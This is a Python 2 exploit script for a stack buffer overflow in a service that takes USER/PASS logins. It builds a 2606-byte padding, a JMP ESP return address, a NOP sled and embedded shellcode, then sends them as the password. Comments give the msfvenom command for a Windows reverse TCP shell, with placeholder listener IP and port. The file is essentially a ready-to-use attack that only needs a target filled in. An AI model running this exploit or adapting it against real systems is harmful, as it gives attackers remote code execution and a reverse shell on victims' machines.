 #!/usr/bin/python
import socket

#badchars /x00/x0a/x0d/
#replace 'shellcode' with your own generated msfvenom 
#msfvenom -p /windows/shell_reverse_tcp LHOST=<YOUR IP> LPORT=<LOCAL PORT> -f c -a x86 --platform windows -b "x00\x0a\x0d" -e shikata_ga_nai

shellcode= ("\xbb\xc1\x8f\x42\xf3\xd9\xea\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x31\x5f\x12\x83\xc7\x04\x03\x9e\x81\xa0\x06\xdc\x76\xa6"
"\xe9\x1c\x87\xc7\x60\xf9\xb6\xc7\x17\x8a\xe9\xf7\x5c\xde\x05"
"\x73\x30\xca\x9e\xf1\x9d\xfd\x17\xbf\xfb\x30\xa7\xec\x38\x53"
"\x2b\xef\x6c\xb3\x12\x20\x61\xb2\x53\x5d\x88\xe6\x0c\x29\x3f"
"\x16\x38\x67\xfc\x9d\x72\x69\x84\x42\xc2\x88\xa5\xd5\x58\xd3"
"\x65\xd4\x8d\x6f\x2c\xce\xd2\x4a\xe6\x65\x20\x20\xf9\xaf\x78"
"\xc9\x56\x8e\xb4\x38\xa6\xd7\x73\xa3\xdd\x21\x80\x5e\xe6\xf6"
"\xfa\x84\x63\xec\x5d\x4e\xd3\xc8\x5c\x83\x82\x9b\x53\x68\xc0"
"\xc3\x77\x6f\x05\x78\x83\xe4\xa8\xae\x05\xbe\x8e\x6a\x4d\x64"
"\xae\x2b\x2b\xcb\xcf\x2b\x94\xb4\x75\x20\x39\xa0\x07\x6b\x56"
"\x05\x2a\x93\xa6\x01\x3d\xe0\x94\x8e\x95\x6e\x95\x47\x30\x69"
"\xda\x7d\x84\xe5\x25\x7e\xf5\x2c\xe2\x2a\xa5\x46\xc3\x52\x2e"
"\x96\xec\x86\xe1\xc6\x42\x79\x42\xb6\x22\x29\x2a\xdc\xac\x16"
"\x4a\xdf\x66\x3f\xe1\x1a\xe1\x4a\xfd\x24\xd4\x22\x03\x24\x17"
"\x08\x8a\xc2\x7d\x7e\xdb\x5d\xea\xe7\x46\x15\x8b\xe8\x5c\x50"
"\x8b\x63\x53\xa5\x42\x84\x1e\xb5\x33\x64\x55\xe7\x92\x7b\x43"
"\x8f\x79\xe9\x08\x4f\xf7\x12\x87\x18\x50\xe4\xde\xcc\x4c\x5f"
"\x49\xf2\x8c\x39\xb2\xb6\x4a\xfa\x3d\x37\x1e\x46\x1a\x27\xe6"
"\x47\x26\x13\xb6\x11\xf0\xcd\x70\xc8\xb2\xa7\x2a\xa7\x1c\x2f"
"\xaa\x8b\x9e\x29\xb3\xc1\x68\xd5\x02\xbc\x2c\xea\xab\x28\xb9"
"\x93\xd1\xc8\x46\x4e\x52\xf8\x0c\xd2\xf3\x91\xc8\x87\x41\xfc"
"\xea\x72\x85\xf9\x68\x76\x76\xfe\x71\xf3\x73\xba\x35\xe8\x09"
"\xd3\xd3\x0e\xbd\xd4\xf1")

#5f4a358f JMP ESP 

buffer ="A"*2606+"\x8f\x35\x4a\x5f" + "\x90" * 16 +shellcode + "C" * (3500-2606-4-351-16)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('ip', port ))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
print "\nDone!"
s.close() 
